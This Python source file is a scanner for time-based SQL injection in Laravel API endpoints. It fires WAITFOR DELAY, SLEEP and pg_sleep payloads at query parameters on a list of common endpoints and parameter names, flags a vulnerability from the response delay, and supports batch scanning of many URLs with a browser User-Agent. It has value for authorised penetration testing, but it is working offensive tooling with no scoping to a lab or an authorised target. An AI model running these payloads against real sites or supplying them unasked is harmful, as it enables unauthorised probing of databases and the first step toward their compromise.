#!/usr/bin/env python3
"""
Time-based SQL Injection Scanner for Laravel API Endpoints

This module detects time-based SQL injection vulnerabilities by measuring
response time delays when injecting time-delay SQL payloads into API parameters.
"""

import requests
import time
from urllib.parse import urljoin, quote
from typing import Dict, List, Optional, Union


def scan(target_url: str) -> Optional[Dict[str, Union[str, float]]]:
    """
    Scan for time-based SQL injection vulnerability in Laravel API endpoints.
    
    Args:
        target_url (str): The target URL to scan
        
    Returns:
        Optional[Dict]: Dictionary with vulnerability details if found, None otherwise
        Format: {"path": "/api/data", "url": "https://example.com/api/data?id=1'+WAITFOR+DELAY+'0:0:5--", "delay": 5.3}
    """
    if not target_url:
        return None
    
    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    # Remove trailing slash for consistent path joining
    target_url = target_url.rstrip('/')
    
    # API endpoint to test
    api_path = '/api/data'
    
    # Request headers
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive'
    }
    
    try:
        # Step 1: Get baseline response time
        baseline_url = urljoin(target_url, api_path) + '?id=1'
        baseline_time = _measure_response_time(baseline_url, headers)
        
        if baseline_time is None:
            return None
        
        # Step 2: Test with time-delay SQL injection payload
        payload = "1'+WAITFOR+DELAY+'0:0:5'--"
        injection_url = urljoin(target_url, api_path) + f'?id={quote(payload)}'
        injection_time = _measure_response_time(injection_url, headers)
        
        if injection_time is None:
            return None
        
        # Step 3: Calculate delay difference
        delay_difference = injection_time - baseline_time
        
        # Step 4: Check if delay indicates SQL injection vulnerability
        if delay_difference >= 4.5:
            return {
                "path": api_path,
                "url": injection_url,
                "delay": delay_difference,
                "baseline_time": baseline_time,
                "injection_time": injection_time
            }
            
    except Exception:
        # Silently handle any errors
        pass
    
    return None


def _measure_response_time(url: str, headers: Dict[str, str]) -> Optional[float]:
    """
    Measure response time for a given URL.
    
    Args:
        url (str): The URL to test
        headers (Dict[str, str]): Request headers
        
    Returns:
        Optional[float]: Response time in seconds, None if request failed
    """
    try:
        start_time = time.time()
        
        response = requests.get(
            url,
            headers=headers,
            timeout=15,  # Higher timeout to allow for injection delays
            allow_redirects=False
        )
        
        end_time = time.time()
        return end_time - start_time
        
    except Exception:
        return None


def scan_detailed(target_url: str) -> Optional[Dict[str, Union[str, float, Dict, List]]]:
    """
    Perform detailed time-based SQL injection scan with multiple payloads.
    
    Args:
        target_url (str): The target URL to scan
        
    Returns:
        Optional[Dict]: Detailed vulnerability information
    """
    if not target_url:
        return None
    
    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    target_url = target_url.rstrip('/')
    
    api_path = '/api/data'
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Accept': 'application/json, text/plain, */*'
    }
    
    try:
        # Get baseline response time
        baseline_url = urljoin(target_url, api_path) + '?id=1'
        baseline_time = _measure_response_time(baseline_url, headers)
        
        if baseline_time is None:
            return None
        
        # Test multiple time-delay payloads
        payloads = [
            "1'+WAITFOR+DELAY+'0:0:5'--",  # SQL Server
            "1'+SLEEP(5)--",               # MySQL
            "1'+pg_sleep(5)--",            # PostgreSQL
            "1';WAITFOR+DELAY+'0:0:5'--",  # Alternative SQL Server
            "1';SELECT+SLEEP(5)--"         # Alternative MySQL
        ]
        
        for payload in payloads:
            injection_url = urljoin(target_url, api_path) + f'?id={quote(payload)}'
            injection_time = _measure_response_time(injection_url, headers)
            
            if injection_time is not None:
                delay_difference = injection_time - baseline_time
                
                if delay_difference >= 4.5:
                    return {
                        "path": api_path,
                        "url": injection_url,
                        "delay": delay_difference,
                        "baseline_time": baseline_time,
                        "injection_time": injection_time,
                        "successful_payload": payload,
                        "tested_payloads": payloads,
                        "vulnerability_type": "time_based_sqli"
                    }
                    
    except Exception:
        pass
    
    return None


def scan_multiple_endpoints(target_url: str) -> Optional[Dict[str, Union[str, float, List]]]:
    """
    Scan multiple API endpoints for time-based SQL injection.
    
    Args:
        target_url (str): The target URL to scan
        
    Returns:
        Optional[Dict]: Vulnerability information with endpoint details
    """
    if not target_url:
        return None
    
    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    target_url = target_url.rstrip('/')
    
    # Common Laravel API endpoints to test
    api_endpoints = [
        '/api/data',
        '/api/users',
        '/api/posts',
        '/api/products',
        '/api/items',
        '/api/search',
        '/api/user',
        '/api/admin'
    ]
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for endpoint in api_endpoints:
        try:
            # Get baseline response time
            baseline_url = urljoin(target_url, endpoint) + '?id=1'
            baseline_time = _measure_response_time(baseline_url, headers)
            
            if baseline_time is None:
                continue
            
            # Test with time-delay payload
            payload = "1'+WAITFOR+DELAY+'0:0:5'--"
            injection_url = urljoin(target_url, endpoint) + f'?id={quote(payload)}'
            injection_time = _measure_response_time(injection_url, headers)
            
            if injection_time is not None:
                delay_difference = injection_time - baseline_time
                
                if delay_difference >= 4.5:
                    return {
                        "path": endpoint,
                        "url": injection_url,
                        "delay": delay_difference,
                        "baseline_time": baseline_time,
                        "injection_time": injection_time,
                        "tested_endpoints": api_endpoints,
                        "vulnerable_endpoint": endpoint
                    }
                    
        except Exception:
            continue
    
    return None


def scan_different_parameters(target_url: str) -> Optional[Dict[str, Union[str, float, List]]]:
    """
    Test time-based SQL injection on different parameter names.
    
    Args:
        target_url (str): The target URL to scan
        
    Returns:
        Optional[Dict]: Vulnerability information with parameter details
    """
    if not target_url:
        return None
    
    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    target_url = target_url.rstrip('/')
    
    api_path = '/api/data'
    
    # Common parameter names to test
    parameters = ['id', 'user_id', 'product_id', 'search', 'query', 'filter', 'category']
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for param in parameters:
        try:
            # Get baseline response time
            baseline_url = urljoin(target_url, api_path) + f'?{param}=1'
            baseline_time = _measure_response_time(baseline_url, headers)
            
            if baseline_time is None:
                continue
            
            # Test with time-delay payload
            payload = "1'+WAITFOR+DELAY+'0:0:5'--"
            injection_url = urljoin(target_url, api_path) + f'?{param}={quote(payload)}'
            injection_time = _measure_response_time(injection_url, headers)
            
            if injection_time is not None:
                delay_difference = injection_time - baseline_time
                
                if delay_difference >= 4.5:
                    return {
                        "path": api_path,
                        "url": injection_url,
                        "delay": delay_difference,
                        "baseline_time": baseline_time,
                        "injection_time": injection_time,
                        "vulnerable_parameter": param,
                        "tested_parameters": parameters
                    }
                    
        except Exception:
            continue
    
    return None


def verify_vulnerability(target_url: str, vulnerable_endpoint: str, parameter: str = 'id') -> Optional[Dict[str, Union[str, float, bool]]]:
    """
    Verify time-based SQL injection vulnerability with multiple tests.
    
    Args:
        target_url (str): The target URL
        vulnerable_endpoint (str): The endpoint that showed vulnerability
        parameter (str): The parameter name to test
        
    Returns:
        Optional[Dict]: Verification results
    """
    if not target_url or not vulnerable_endpoint:
        return None
    
    # Normalize URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    target_url = target_url.rstrip('/')
    
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    try:
        # Run multiple verification tests
        verification_results = []
        
        for i in range(3):  # Test 3 times for consistency
            # Baseline
            baseline_url = urljoin(target_url, vulnerable_endpoint) + f'?{parameter}=1'
            baseline_time = _measure_response_time(baseline_url, headers)
            
            if baseline_time is None:
                continue
            
            # Injection
            payload = "1'+WAITFOR+DELAY+'0:0:5'--"
            injection_url = urljoin(target_url, vulnerable_endpoint) + f'?{parameter}={quote(payload)}'
            injection_time = _measure_response_time(injection_url, headers)
            
            if injection_time is not None:
                delay_difference = injection_time - baseline_time
                verification_results.append({
                    "test_number": i + 1,
                    "delay": delay_difference,
                    "vulnerable": delay_difference >= 4.5
                })
        
        # Check if majority of tests show vulnerability
        vulnerable_tests = sum(1 for result in verification_results if result["vulnerable"])
        is_verified = vulnerable_tests >= 2  # At least 2 out of 3 tests
        
        if verification_results:
            avg_delay = sum(result["delay"] for result in verification_results) / len(verification_results)
            
            return {
                "endpoint": vulnerable_endpoint,
                "parameter": parameter,
                "verified": is_verified,
                "average_delay": avg_delay,
                "test_results": verification_results,
                "confidence": "high" if vulnerable_tests == 3 else "medium" if vulnerable_tests == 2 else "low"
            }
            
    except Exception:
        pass
    
    return None


def batch_scan(urls: List[str]) -> List[Dict[str, Union[str, Dict, None]]]:
    """
    Scan multiple URLs for time-based SQL injection vulnerabilities.
    
    Args:
        urls (List[str]): List of URLs to scan
        
    Returns:
        List[Dict]: List of scan results for each URL
    """
    results = []
    
    for url in urls:
        scan_result = scan(url)
        results.append({
            "url": url,
            "result": scan_result
        })
    
    return results